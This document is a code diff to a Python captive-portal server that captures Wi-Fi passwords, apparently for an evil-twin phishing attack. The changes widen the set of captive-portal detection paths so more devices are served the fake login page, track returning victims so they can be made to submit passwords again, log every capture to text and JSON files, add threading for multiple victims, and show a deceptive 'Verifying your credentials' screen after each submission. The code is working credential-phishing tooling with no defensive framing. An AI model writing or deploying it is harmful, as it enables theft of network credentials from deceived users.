@@ -2,6 +2,7 @@
 """
 Captive Portal Web Server with Credential Capture
 Serves portal HTML and captures POST submissions in real-time
+Tracks client sessions for reconnection handling
 """
 
 import http.server
@@ -9,6 +10,7 @@ import urllib.parse
 import os
 import sys
 import json
+import threading
 from datetime import datetime
 from pathlib import Path
 
@@ -33,6 +35,11 @@ Path(CRED_LOG_DIR).mkdir(parents=True, exist_ok=True)
 # Log file path
 LOG_FILE = os.path.join(CRED_LOG_DIR, f"wifi_passwords_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt")
 
+# Track clients that have submitted credentials (by IP)
+# Allows same client to submit multiple times (different passwords attempts)
+submitted_clients = {}  # ip -> list of timestamps
+client_lock = threading.Lock()
+
 
 class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
     """Custom HTTP handler for captive portal"""
@@ -55,20 +62,31 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
         client_ip = self.client_address[0]
         timestamp = datetime.now().strftime('%H:%M:%S')
 
-        # Captive portal detection endpoints - return portal
+        # Captive portal detection endpoints - always return portal
         captive_paths = [
             '/generate_204',
             '/gen_204',
             '/hotspot-detect.html',
+            '/hotspot-detect',
             '/connecttest.txt',
             '/success.txt',
             '/ncsi.txt',
             '/redirect',
             '/library/test/success.html',
+            '/kindle-wifi/wifistub.html',
+            '/check_network_status.txt',
         ]
 
         if self.path in captive_paths or self.path == '/':
+            # Always serve the portal - even for returning clients
+            # This ensures they can re-enter credentials on reconnection
             self.path = '/index.html'
+
+            with client_lock:
+                if client_ip in submitted_clients:
+                    print(f"{YELLOW}[{timestamp}]{NC} {WHITE}Returning client:{NC} {client_ip} (submitted {len(submitted_clients[client_ip])}x before)")
+                else:
+                    print(f"{CYAN}[{timestamp}]{NC} {WHITE}New client:{NC} {client_ip}")
 
         # Check if file exists, otherwise serve index.html
         file_path = os.path.join(PORTAL_DIR, self.path.lstrip('/'))
@@ -97,9 +115,19 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
         # Get user agent
         user_agent = self.headers.get('User-Agent', 'Unknown')
 
+        # Track this submission
+        with client_lock:
+            if client_ip not in submitted_clients:
+                submitted_clients[client_ip] = []
+            submitted_clients[client_ip].append(timestamp)
+
+        submission_count = len(submitted_clients.get(client_ip, []))
+
         # Real-time terminal output
         print(f"\n{GREEN}{'='*60}{NC}")
         print(f"{GREEN}[{timestamp_short}] CREDENTIAL CAPTURED!{NC}")
+        if submission_count > 1:
+            print(f"{YELLOW}  (Attempt #{submission_count} from this client){NC}")
         print(f"{GREEN}{'='*60}{NC}")
         print(f"{WHITE}  IP Address:{NC}  {client_ip}")
         for key, value in credentials.items():
@@ -113,6 +141,8 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
             f.write(f"{'='*50}\n")
             f.write(f"Timestamp: {timestamp}\n")
             f.write(f"IP Address: {client_ip}\n")
+            if submission_count > 1:
+                f.write(f"Attempt: #{submission_count}\n")
             for key, value in credentials.items():
                 f.write(f"{key.capitalize()}: {value}\n")
             f.write(f"User Agent: {user_agent}\n")
@@ -123,13 +153,27 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
         capture_data = {
             'timestamp': timestamp,
             'ip': client_ip,
+            'attempt': submission_count,
             'credentials': credentials,
             'user_agent': user_agent
         }
         with open(json_log, 'w') as f:
             json.dump(capture_data, f, indent=2)
 
-        # Send redirect response
+        # Append to all captures JSON
+        all_captures_file = os.path.join(CRED_LOG_DIR, 'all_captures.json')
+        all_captures = []
+        if os.path.exists(all_captures_file):
+            try:
+                with open(all_captures_file, 'r') as f:
+                    all_captures = json.load(f)
+            except (json.JSONDecodeError, IOError):
+                all_captures = []
+        all_captures.append(capture_data)
+        with open(all_captures_file, 'w') as f:
+            json.dump(all_captures, f, indent=2)
+
+        # Send redirect response - shows "Connecting..." then redirects
         redirect_html = f"""<!DOCTYPE html>
 <html>
 <head>
@@ -172,8 +216,8 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
 <body>
     <div class="message">
         <div class="spinner"></div>
-        <h2>Connecting to WiFi...</h2>
-        <p>You will be redirected shortly.</p>
+        <h2>Authenticating...</h2>
+        <p>Verifying your credentials. Please wait.</p>
     </div>
 </body>
 </html>"""
@@ -183,6 +227,24 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
         self.send_header('Content-Length', len(redirect_html))
         self.end_headers()
         self.wfile.write(redirect_html.encode())
+
+
+class ThreadedHTTPServer(http.server.HTTPServer):
+    """Handle requests in a threaded fashion for multiple clients"""
+    allow_reuse_address = True
+
+    def process_request(self, request, client_address):
+        thread = threading.Thread(target=self._handle_request, args=(request, client_address))
+        thread.daemon = True
+        thread.start()
+
+    def _handle_request(self, request, client_address):
+        try:
+            self.finish_request(request, client_address)
+        except Exception:
+            self.handle_error(request, client_address)
+        finally:
+            self.shutdown_request(request)
 
 
 def main():
@@ -196,7 +258,7 @@ def main():
     print(f"{GREEN}{'='*60}{NC}")
     print(f"{YELLOW}  Waiting for connections...{NC}\n")
 
-    server = http.server.HTTPServer((BIND_ADDR, BIND_PORT), CaptivePortalHandler)
+    server = ThreadedHTTPServer((BIND_ADDR, BIND_PORT), CaptivePortalHandler)
 
     try:
         server.serve_forever()
